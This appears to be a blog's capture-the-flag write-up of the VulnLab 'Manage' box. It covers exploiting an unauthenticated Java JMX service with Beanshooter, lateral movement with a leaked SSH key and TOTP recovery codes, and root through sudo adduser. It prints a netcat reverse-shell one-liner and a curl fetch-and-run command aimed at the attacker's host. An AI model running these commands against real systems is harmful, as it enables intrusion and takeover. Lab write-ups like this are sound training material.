+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../index.html" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://avatars.githubusercontent.com/u/108031577?v=4" alt="Tom Fieber">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          <a href="https://tomfieber.github.io">Tom Fieber</a>
+                        
+                      </strong>
+                      <br>
+                      Dad, husband, okay pentester
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2024-06-28 00:00:00+00:00" class="md-ellipsis">June 28, 2024</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../category/writeups.html">writeups</a>, 
+                              <a href="../../../category/vulnlab.html">vulnlab</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              8 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">Java-RMI</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">linux</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">sudo</span>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="vulnlab-manage">VulnLab: Manage<a class="headerlink" href="#vulnlab-manage" title="Permanent link">&para;</a></h1>
+<p>Manage is an <strong>EASY</strong> machine on <a href="https://wiki.vulnlab.com/guidance/easy/manage">VulnLab</a>. This box involved abusing a Java JMX service to get command execution on the server. Once on the server, we find a backup archive that contains files from a user's home directory that we can use to move laterally. After moving to the second user, we find that we're able to run a command as root that we can use to add a new privileged user on the system. </p>
+<!-- more -->
+<p><a class="glightbox" href="../../../images/vulnlab_manage/manage.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/vulnlab_manage/manage.png" /></a></p>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="go">PORT      STATE SERVICE    REASON         VERSION</span>
+<span class="go">22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey:</span>
+<span class="go">|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)</span>
+<span class="go">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=</span>
+<span class="go">|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)</span>
+<span class="go">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh</span>
+<span class="go">2222/tcp  open  java-rmi   syn-ack ttl 63 Java RMI</span>
+<span class="go">| rmi-dumpregistry:</span>
+<span class="go">|   jmxrmi</span>
+<span class="go">|     javax.management.remote.rmi.RMIServerImpl_Stub</span>
+<span class="go">|     @127.0.1.1:34355</span>
+<span class="go">|     extends</span>
+<span class="go">|       java.rmi.server.RemoteStub</span>
+<span class="go">|       extends</span>
+<span class="go">|_        java.rmi.server.RemoteObject</span>
+<span class="go">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span>
+<span class="go">8080/tcp  open  http       syn-ack ttl 63 Apache Tomcat 10.1.19</span>
+<span class="go">|_http-favicon: Apache Tomcat</span>
+<span class="go">| http-methods:</span>
+<span class="go">|_  Supported Methods: GET HEAD POST OPTIONS</span>
+<span class="go">|_http-title: Apache Tomcat/10.1.19</span>
+<span class="go">33337/tcp open  tcpwrapped syn-ack ttl 63</span>
+<span class="go">34355/tcp open  java-rmi   syn-ack ttl 63 Java RMI</span>
+<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">10.10.126.113:22</span>
+<span class="go">10.10.126.113:2222</span>
+<span class="go">10.10.126.113:8080</span>
+<span class="go">10.10.126.113:33337</span>
+<span class="go">10.10.126.113:34355</span>
+</code></pre></div>
+<p>Right off the bat, the most interesting service is the Java-RMI service on port 2222. Note the <code>jmxrmi</code> in the nmap output. According to the Oracle documentation, the Java Management Extensions (JMX) is a standard part of the Java platform that provides a simple, standard way of managing resources such as applications, devices, and services. </p>
+<p><a href="https://docs.oracle.com/javase/tutorial/jmx/overview/index.html">Overview of JMX Technology</a></p>
+<p>Managed Beans, or MBeans, are a fundamental concept of the JMX API. The JMX specification defines five types of beans:</p>
+<ul>
+<li>Standard MBeans</li>
+<li>Dynamic MBeans</li>
+<li>Open MBeans</li>
+<li>Model MBeans</li>
+<li>MXBeans</li>
+</ul>
+<p><a href="https://docs.oracle.com/javase/tutorial/jmx/mbeans/index.html">Introducing MBeans</a></p>
+<h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
+<h3 id="exploiting-java-jmxrmi">Exploiting Java JMXRMI<a class="headerlink" href="#exploiting-java-jmxrmi" title="Permanent link">&para;</a></h3>
+<p>We can use the <a href="https://github.com/qtc-de/beanshooter">Beanshooter</a> tool to enumerate the <code>jmxrmi</code> service and ultimately exploit the service to get a foothold on the box.</p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  manage $ beanshooter enum $ip 2222                                                                                          </span>
+<span class="go">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span>
+<span class="go">[+] Checking available bound names:</span>
+<span class="go">[+]</span>
+<span class="go">[+]     * jmxrmi (JMX endpoint: 127.0.1.1:44703)</span>
+<span class="go">[+]</span>
+<span class="go">[+] Checking for unauthorized access:</span>
+<span class="go">[+]</span>
+<span class="go">[+]     - Remote MBean server does not require authentication.</span>
+<span class="go">[+]       Vulnerability Status: Vulnerable</span>
+<span class="go">[+]</span>
+<span class="go">[+] Checking pre-auth deserialization behavior:</span>
+<span class="go">[+]</span>
+<span class="go">[+]     - Remote MBeanServer rejected the payload class.</span>
+<span class="go">[+]       Vulnerability Status: Non Vulnerable</span>
+<span class="go">[+]</span>
+<span class="go">[+] Checking available MBeans:</span>
+<span class="go">[+]</span>
+<span class="go">[+]     - 158 MBeans are currently registred on the MBean server.</span>
+<span class="go">[+]       Listing 136 non default MBeans:</span>
+<span class="go">[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=numberwriter,J2EEApplication=none,J2EEServer=none)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.NamingResourcesMBean (Catalina:type=NamingResources,host=localhost,context=/host-manager)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/host-manager,name=HostManager,J2EEApplication=none,J2EEServer=none)</span>
+<span class="go">[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:j2eeType=Filter,WebModule=//localhost/host-manager,name=Tomcat WebSocket (JSR356) Filter,J2EEApplication=none,J2EEServer=none)</span>
+
+<span class="go">[...SNIP...]</span>
+
+<span class="go">[+]       - org.apache.catalina.mbeans.UserMBean (Users:type=User,username=&quot;manager&quot;,database=UserDatabase)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/examples,name=responsetrailer,J2EEApplication=none,J2EEServer=none)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=JMXProxy,J2EEApplication=none,J2EEServer=none)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.ContainerMBean (Catalina:j2eeType=Servlet,WebModule=//localhost/manager,name=HTMLManager,J2EEApplication=none,J2EEServer=none)</span>
+<span class="go">[+]       - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=ParallelWebappClassLoader,host=localhost,context=/)</span>
+<span class="go">[+]       - org.apache.catalina.mbeans.ContextEnvironmentMBean (Catalina:type=Environment,resourcetype=Context,host=localhost,context=/examples,name=foo/bar/name2)</span>
+<span class="go">[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:type=DiagnosticCommand) (action: diagnostic)</span>
+<span class="go">[+]</span>
+<span class="go">[+] Enumerating tomcat users:</span>
+<span class="go">[+]</span>
+<span class="go">[+]     - Listing 2 tomcat users:</span>
+<span class="go">[+]</span>
+<span class="go">[+]             ----------------------------------------</span>
+<span class="go">[+]             Username:  manager</span>
+<span class="go">[+]             Password:  fhErvo2r9wuTEYiYgt</span>
+<span class="go">[+]             Roles:</span>
+<span class="go">[+]                        Users:type=Role,rolename=&quot;manage-gui&quot;,database=UserDatabase</span>
+<span class="go">[+]</span>
+<span class="go">[+]             ----------------------------------------</span>
+<span class="go">[+]             Username:  admin</span>
+<span class="go">[+]             Password:  onyRPCkaG4iX72BrRtKgbszd</span>
+<span class="go">[+]             Roles:</span>
+<span class="go">[+]                        Users:type=Role,rolename=&quot;role1&quot;,database=UserDatabase</span>
+</code></pre></div>
+<p>After looking through the documentation, it's possible to get code execution by leveraging the <code>standard</code> MBean to execute commands on the server.</p>
+<p>There are probably multiple ways to do this, but I put the following payload in a file and saved it as <code>shell.sh</code></p>
+<div class="highlight"><pre><span></span><code><span class="go">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.8.2.86 9001 &gt;/tmp/f</span>
+</code></pre></div>
+<p>We can use <code>beanshooter</code> to grab the <code>shell.sh</code> file from our attacker machine. Please note that I have an alias set up for 'beanshooter' that runs the JAR file. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  manage $ beanshooter standard $ip 2222 exec &#39;curl http://10.8.2.86:8000/shell.sh -o /dev/shm/shell.sh&#39;</span>
+<span class="go">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span>
+<span class="go">[+] Creating a TemplateImpl payload object to abuse StandardMBean</span>
+<span class="go">[+]</span>
+<span class="go">[+]     Deplyoing MBean: StandardMBean</span>
+<span class="go">[+]     MBean with object name de.qtc.beanshooter:standard=4573249368457 was successfully deployed.</span>
+<span class="go">[+]</span>
+<span class="go">[+]     Caught NullPointerException while invoking the newTransformer action.</span>
+<span class="go">[+]     This is expected bahavior and the attack most likely worked :)</span>
+<span class="go">[+]</span>
+<span class="go">[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=4573249368457 from the MBeanServer.</span>
+<span class="go">[+]     MBean was successfully removed.</span>
+</code></pre></div>
+<p>Once the <code>shell.sh</code> file is on the target machine we can execute it with the following:</p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  manage $ beanshooter standard $ip 2222 exec &#39;sh /dev/shm/shell.sh&#39;</span>
+<span class="go">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span>
+<span class="go">[+] Creating a TemplateImpl payload object to abuse StandardMBean</span>
+<span class="go">[+]</span>
+<span class="go">[+]     Deplyoing MBean: StandardMBean</span>
+<span class="go">[+]     MBean with object name de.qtc.beanshooter:standard=4794690013321 was successfully deployed.</span>
+<span class="go">[+]</span>
+<span class="go">[+]     Caught NullPointerException while invoking the newTransformer action.</span>
+<span class="go">[+]     This is expected bahavior and the attack most likely worked :)</span>
+<span class="go">[+]</span>
+<span class="go">[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=4794690013321 from the MBeanServer.</span>
+<span class="go">[+]     MBean was successfully removed.</span>
+</code></pre></div>
+<p>When that runs we get a shell as the <code>tomcat</code> user and can grab the <code>user.txt</code> flag from the <code>/opt/tomcat</code> directory. </p>
+<h2 id="lateral-movement">Lateral Movement<a class="headerlink" href="#lateral-movement" title="Permanent link">&para;</a></h2>
+<p>Looking around the file system, we find a backups directory in the <code>/home/useradmin</code> folder. </p>
+<div class="highlight"><pre><span></span><code><span class="gp">tomcat@manage:/home/useradmin/backups$ </span>ls<span class="w"> </span>-la
+<span class="go">ls -la</span>
+<span class="go">total 12</span>
+<span class="go">drwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .</span>
+<span class="go">drwxr-xr-x 5 useradmin useradmin 4096 Jun 21 16:51 ..</span>
+<span class="go">-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz</span>
+</code></pre></div>
+<p>We can transfer that <code>bacckup.tar.gz</code> file over to our attacker machine and extract it. once we've done that, we find what appears to be a backup of the <code>useradmin</code> home directory. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  backups $ ls -la</span>
+<span class="go">total 22</span>
+<span class="go">drwxrwxrwx 1 root root 4096 Jun 21 11:48 .</span>
+<span class="go">drwxrwxrwx 1 root root 4096 Jun 28 16:49 ..</span>
+<span class="go">drwxrwxrwx 1 root root    0 Jun 21 11:48 .cache</span>
+<span class="go">drwxrwxrwx 1 root root 4096 Jun 21 10:53 .ssh</span>
+<span class="go">-rwxrwxrwx 1 root root  220 Jun 21 10:46 .bash_logout</span>
+<span class="go">-rwxrwxrwx 1 root root 3771 Jun 21 10:46 .bashrc</span>
+<span class="go">-r-xr-xr-x 1 root root  200 Jun 21 11:48 .google_authenticator</span>
+<span class="go">-rwxrwxrwx 1 root root  807 Jun 21 10:46 .profile</span>
+<span class="go">-rwxrwxrwx 1 root root 3088 Jun 21 11:50 backup.tar.gz</span>
+</code></pre></div>
+<p>That <code>.google_authenticator</code> file looks interesting. Checking that out, it seems to contain some backup codes and maybe a secret to set up Google Authenticator for generating Time-based One-Time Passwords (TOTP). Set this aside for now; we'll need these later on.</p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  backups $ cat .google_authenticator</span>
+<span class="go">CLSSSMHYGLENX5HAIFBQ6L35UM</span>
+<span class="go">&quot; RATE_LIMIT 3 30 1718988529</span>
+<span class="go">&quot; WINDOW_SIZE 3</span>
+<span class="go">&quot; DISALLOW_REUSE 57299617</span>
+<span class="go">&quot; TOTP_AUTH</span>
+<span class="go">99852083</span>
+<span class="go">20312647</span>
+<span class="go">73235136</span>
+<span class="go">92971994</span>
+<span class="go">86175591</span>
+<span class="go">98991823</span>
+<span class="go">54032641</span>
+<span class="go">69267218</span>
+<span class="go">76839253</span>
+<span class="go">56800775</span>
+</code></pre></div>
+<p>Checking the <code>.ssh</code> directory, we find a private key. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  .ssh $ ls -la</span>
+<span class="go">total 10</span>
+<span class="go">drwxrwxrwx 1 root root 4096 Jun 21 10:53 .</span>
+<span class="go">drwxrwxrwx 1 root root 4096 Jun 21 11:48 ..</span>
+<span class="go">-rwxrwxrwx 1 root root   98 Jun 21 10:56 authorized_keys</span>
+<span class="go">-rwxrwxrwx 1 root root  411 Jun 21 10:53 id_ed25519</span>
+<span class="go">-rwxrwxrwx 1 root root   98 Jun 21 10:53 id_ed25519.pub</span>
+</code></pre></div>
+<p>When trying to ssh using the key, we get prompted for a verification code. Grab one of the recovery codes from the <code>.google_authenticator</code> file and use that here. </p>
+<div class="highlight"><pre><span></span><code><span class="go">➜  .ssh $ ssh -i id_ed25519 useradmin@$ip</span>
+<span class="go">The authenticity of host &#39;10.10.93.168 (10.10.93.168)&#39; can&#39;t be established.</span>
+<span class="go">ED25519 key fingerprint is SHA256:mTJofQVp4T/1uO1CFsfPt8SADZfjbzIIynR0Zeqi0qo.</span>
+<span class="go">This host key is known by the following other names/addresses:</span>
+<span class="go">    ~/.ssh/known_hosts:1: [hashed name]</span>
+<span class="go">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="go">Warning: Permanently added &#39;10.10.93.168&#39; (ED25519) to the list of known hosts.</span>
+<span class="gp gp-VirtualEnv">(useradmin@10.10.93.168)</span> <span class="go">Verification code:</span>
+<span class="go">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/pro</span>
+
+<span class="go"> System information as of Fri Jun 28 10:12:35 PM UTC 2024</span>
+
+<span class="go">  System load:  0.0               Processes:             111</span>
+<span class="go">  Usage of /:   74.4% of 6.06GB   Users logged in:       0</span>
+<span class="go">  Memory usage: 39%               IPv4 address for ens5: 10.10.93.168</span>
+<span class="go">  Swap usage:   0%</span>
+
+<span class="go"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s</span>
+<span class="go">   just raised the bar for easy, resilient and secure K8s cluster deployment.</span>
+
+<span class="go">   https://ubuntu.com/engage/secure-kubernetes-at-the-edge</span>
+
+<span class="go">Expanded Security Maintenance for Applications is not enabled.</span>
+
+<span class="go">0 updates can be applied immediately.</span>
+
+<span class="go">Enable ESM Apps to receive additional future security updates.</span>
+<span class="go">See https://ubuntu.com/esm or run: sudo pro status</span>
+
+
+<span class="go">The list of available updates is more than a week old.</span>
+<span class="go">To check for new updates run: sudo apt update</span>
+
+<span class="go">Last login: Fri Jun 21 16:48:53 2024 from 192.168.94.139</span>
+<span class="gp">useradmin@manage:~$</span>
+</code></pre></div>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>Checking to see what the <code>useradmin</code> user can run as root, we see that we're able to run <code>adduser</code>, but we're limited to alphanumeric characters, so no passing arguments like <code>--uid</code>. </p>
+<div class="highlight"><pre><span></span><code><span class="gp">useradmin@manage:~$ </span>sudo<span class="w"> </span>-l
+<span class="go">Matching Defaults entries for useradmin on manage:</span>
+<span class="go">    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span>
+<span class="go">    use_pty</span>
+
+<span class="go">User useradmin may run the following commands on manage:</span>
+<span class="go">    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$</span>
+</code></pre></div>
+<p>We're given a hint on this box to look at the default Ubuntu sudoers file. When we do, we see that members of the <code>admin</code> group may gain root privileges</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>Members<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>admin<span class="w"> </span>group<span class="w"> </span>may<span class="w"> </span>gain<span class="w"> </span>root<span class="w"> </span>privileges
+<span class="gp">%</span>admin<span class="w"> </span><span class="nv">ALL</span><span class="o">=(</span>ALL<span class="o">)</span><span class="w"> </span>ALL
+</code></pre></div>
+<p>Since we know that when a new user is created, a matching group is created (by default), if we add an <code>admin</code> user, then the <code>admin</code> group should be added and the <code>admin</code> user will be added automatically. </p>
+<div class="highlight"><pre><span></span><code><span class="gp">useradmin@manage:~$ </span>sudo<span class="w"> </span>/usr/sbin/adduser<span class="w"> </span>admin
+<span class="go">Adding user `admin&#39; ...</span>
+<span class="go">Adding new group `admin&#39; (1003) ...</span>
+<span class="go">Adding new user `admin&#39; (1003) with group `admin&#39; ...</span>
+<span class="go">Creating home directory `/home/admin&#39; ...</span>
+<span class="go">Copying files from `/etc/skel&#39; ...</span>
+<span class="go">New password:</span>
+<span class="go">Retype new password:</span>
+<span class="go">passwd: password updated successfully</span>
+<span class="go">Changing the user information for admin</span>
+<span class="go">Enter the new value, or press ENTER for the default</span>
+<span class="go">        Full Name []: Admin</span>
+<span class="go">        Room Number []:</span>
+<span class="go">        Work Phone []:</span>
+<span class="go">        Home Phone []:</span>
+<span class="go">        Other []:</span>
+<span class="go">Is the information correct? [Y/n]</span>
+</code></pre></div>
+<p>After switching to the admin user and running <code>sudo -l</code> again, we see that we can run any command as root.</p>
+<div class="highlight"><pre><span></span><code><span class="gp">admin@manage:/home/useradmin$ </span>sudo<span class="w"> </span>-l
+<span class="go">[sudo] password for admin:</span>
+<span class="go">Matching Defaults entries for admin on manage:</span>
+<span class="go">    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span>
+<span class="go">    use_pty</span>
+
+<span class="go">User admin may run the following commands on manage:</span>
+<span class="go">    (ALL) ALL</span>
+</code></pre></div>
+<p>We can use <code>sudo su</code> to become root and grab the root flag. </p>
+<div class="highlight"><pre><span></span><code><span class="gp">root@manage:~# </span>ls<span class="w"> </span>-la
+<span class="go">total 40</span>
+<span class="go">drwx------  6 root root 4096 Jun 22 15:15 .</span>
+<span class="go">drwxr-xr-x 19 root root 4096 Mar  1 04:20 ..</span>
+<span class="go">lrwxrwxrwx  1 root root    9 Jun 21 16:52 .bash_history -&gt; /dev/null</span>
+<span class="go">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span>
+<span class="go">drwx------  2 root root 4096 Mar  1 20:14 .cache</span>
+<span class="go">-r--------  1 root root  200 Jun 22 15:12 .google_authenticator</span>
+<span class="go">drwxr-xr-x  3 root root 4096 Jun 21 15:19 .local</span>
+<span class="go">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span>
+<span class="go">-rw-r--r--  1 root root   37 Mar  1 07:29 root.txt</span>
+<span class="go">drwx------  3 root root 4096 Mar  1 04:23 snap</span>
+<span class="go">drwx------  2 root root 4096 Jun 21 15:26 .ssh</span>
+<span class="go">-rw-r--r--  1 root root    0 Mar  1 04:35 .sudo_as_admin_successful</span>
+</code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+  
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks for your feedback! Help us improve this page by using our <a href="..." target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js"
+        data-repo="tomfieber/tomfieber.github.io"
+        data-repo-id="R_kgDOPTkbBA"
+        data-category="General"
+        data-category-id="DIC_kwDOPTkbBM4Ctdzl"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../22/vulnlab-breach.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: VulnLab: Breach">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Breach
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../29/vulnlab-baby.html" class="md-footer__link md-footer__link--next" aria-label="Next: VulnLab: Baby">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                VulnLab: Baby
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025 Tom Fieber
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://x.com/tomfieber" target="_blank" rel="noopener" title="x.com" class="md-social__link">
